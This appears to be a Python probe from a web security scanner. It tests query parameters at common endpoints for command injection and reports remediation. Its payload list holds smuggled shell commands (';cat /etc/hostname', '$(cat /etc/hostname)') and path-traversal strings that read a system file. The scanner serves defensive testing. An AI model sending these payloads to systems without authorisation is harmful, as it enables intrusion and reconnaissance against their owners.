#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Command injection via filename / path query parameter.

Generalises `cmdi_video_subtitles` (Juice Shop's
`/video?subtitles=`). The bug is "the value of a path-shaped query
parameter gets passed to a shell"; the literal endpoint and
parameter name are irrelevant. We sweep candidate parameter names
common in the wild (`file`, `path`, `download`, `export`,
`subtitles`, `template`, `view`, `attachment`, `cmd`, `exec`,
`run`) at common endpoints and look for the marker file content
in the response.

Detection signal: the host-uniqueness of `/etc/hostname` (a single
short alphanumeric line). Either the cmd substitution succeeds and
the response carries the hostname OR the path-traversal-with-shell
combo produces the same effect.
"""
from __future__ import annotations

import re
import secrets
import sys
from pathlib import Path
from urllib.parse import urlencode, urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

# (path, params) tuples to sweep.
TARGETS = (
    ("/",                  ("file", "path", "page", "view")),
    ("/download",          ("file", "filename", "f", "name")),
    ("/export",            ("file", "format")),
    ("/preview",           ("file", "url")),
    ("/template",          ("file", "name", "tpl")),
    ("/view",              ("file", "page", "v")),
    ("/api/files",         ("path", "name", "file")),
    ("/api/v1/files",      ("path", "name")),
    ("/cgi-bin/",          ("cmd", "exec", "run")),
    ("/video",             ("subtitles", "file")),       # JS literal
    ("/render",            ("template", "name", "view")),
)

# Payloads, each tries a different injection style. We pair each
# with the path-traversal escape so we cover both pure-cmdi
# (server passes the param through `bash -c`) and
# traversal-then-cmdi shells.
PAYLOADS = (
    ";cat /etc/hostname",
    "|cat /etc/hostname",
    "&&cat /etc/hostname",
    "$(cat /etc/hostname)",
    "`cat /etc/hostname`",
    "../../../etc/hostname",
    "../../etc/hostname%00",
)

HOSTNAME_RE = re.compile(r"^[a-z0-9](?:[a-z0-9\-]{0,61}[a-z0-9])?$",
                          re.MULTILINE)


def _looks_like_hostname(text: str) -> str | None:
    """Return the matched hostname when the response body contains
    one cleanly. We look for a single short alphanumeric line that
    appears either alone or right after a known shell-output
    marker."""
    if not text:
        return None
    for line in text.splitlines():
        s = line.strip()
        if 2 <= len(s) <= 64 and HOSTNAME_RE.match(s):
            # Eliminate common single-word HTML responses
            # ("ok", "success", "done", etc.).
            if s.lower() in ("ok", "yes", "no", "success", "done",
                              "error", "true", "false", "null"):
                continue
            return s
    return None


class CmdiFilenameParamInQueryProbe(Probe):
    name = "cmdi_filename_param_in_query"
    summary = ("Detects command injection via path / filename query "
               "parameters by injecting shell metacharacters and "
               "looking for /etc/hostname-shape content in the "
               "response.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--target", action="append", default=[],
            help="Additional path|param to test (e.g. '/cgi/run|cmd').")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"

        targets = list(TARGETS)
        for t in args.target or []:
            if "|" in t:
                p, n = t.split("|", 1)
                targets.append((p.strip(), (n.strip(),)))

        # Token gives us a way to avoid mistaking a hostname-shape
        # response for an unrelated label -- on a 200 with status
        # markers the body should contain hostname AS WELL AS the
        # payload-derived value. We don't need to validate the token
        # presence; the hostname regex is enough.
        attempts: list[dict] = []
        confirmed: dict | None = None
        for path, params in targets:
            for pname in params:
                for payload in PAYLOADS:
                    qs = urlencode({pname: payload})
                    url = urljoin(origin, path) + "?" + qs
                    r = client.request("GET", url)
                    row: dict = {"path": path, "param": pname,
                                 "payload": payload,
                                 "status": r.status, "size": r.size}
                    if r.status == 200 and r.body:
                        hit = _looks_like_hostname(r.text)
                        if hit:
                            row.update({"hostname_in_body": hit,
                                        "snippet": (r.text or "")[:200]})
                            confirmed = row
                            attempts.append(row)
                            break
                    attempts.append(row)
                if confirmed:
                    break
            if confirmed:
                break

        evidence = {"origin": origin, "attempts": attempts}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.92,
                summary=(
                    f"Confirmed: command injection at "
                    f"{origin}{confirmed['path']}"
                    f"?{confirmed['param']}={confirmed['payload']!r}. "
                    f"Response carries `{confirmed['hostname_in_body']}` "
                    "in the body -- the injected `cat /etc/hostname` "
                    "executed."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="critical",
                remediation=(
                    "Stop passing the parameter to a shell at all.\n"
                    "  - Use a function that takes argv as a list "
                    "(execve / `subprocess.run([...], shell=False)` / "
                    "`exec.Command(name, args...)` -- not "
                    "`os.system` / `popen` / `bash -c`).\n"
                    "  - If the parameter is a filename, allowlist "
                    "the set of allowed values OR map an opaque id to "
                    "the path server-side.\n"
                    "Audit access logs for shell metacharacter "
                    "patterns (`;cat`, `$(`, ` || `) on the affected "
                    "endpoint."),
            )
        return Verdict(
            validated=False, confidence=0.80,
            summary=(f"Refuted: tried {len(attempts)} "
                     "path/param/payload combinations on "
                     f"{origin}; no shell-output signature returned."),
            evidence=evidence,
        )


if __name__ == "__main__":
    CmdiFilenameParamInQueryProbe().main()
